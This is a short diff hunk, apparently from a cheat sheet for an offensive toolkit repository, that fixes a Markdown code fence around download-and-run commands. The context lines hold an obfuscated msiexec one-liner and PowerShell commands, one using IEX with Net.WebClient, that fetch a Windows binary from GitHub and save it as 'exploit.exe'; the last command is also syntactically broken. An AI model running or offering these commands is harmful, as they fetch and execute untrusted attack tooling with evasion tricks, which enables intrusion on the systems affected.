@@ -141,7 +141,7 @@ msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/dow
 
 
 Windows arm
-``
+```
 64
 powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm64.exe -OutFile exploit.exe"
 powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm64.exe -OutFile exploit.exe', exploit.exe)"
